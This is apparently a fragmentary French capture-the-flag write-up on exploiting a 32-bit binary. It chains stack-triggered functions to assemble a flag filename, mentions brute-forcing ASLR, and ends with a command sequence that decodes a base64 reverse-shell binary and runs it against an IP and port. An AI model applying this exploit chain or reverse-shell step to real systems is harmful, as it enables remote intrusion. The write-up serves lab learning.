...
e8610=0x08048610 #si la pile contient b0b01337, il rajoute .teta à NOM
e8650=0x08048650 #si la pile contient b0b01337, il rajoute .text à NOM
e8690=0x08048690 #si la pile contient 1b0b0c41 et ae13374e, il rajoute mflag à NOM
e86d0=0x080486d0 #imprime un message What am I doing here?
```
nom est initalement à vide. Il suffit donc d'appeler tour à tour les fonctions e8690, e8650, e8590 et e8580 pour avoir le flag. Ces fonctions se déclenchent si et seulement si la pile contient des octets bien précis.
...
```
Il est indispensable de sortir correctement du programme (appel de e8580) faute de quoi aucune sortie n'est récupérée sauf à exécuter plusieurs fois l'impression en bouclant le programme via la chaine
```
...
1) Il y a l'ASLR (avec une entropie classique, un bf est envisageable)
...
puis busybox base64 -d /var/tmp/rsh > /var/tmp/rshb et enfin /var/tmp/rshb IP port mais je n'ai trouvé aucun port accessible en sortie.
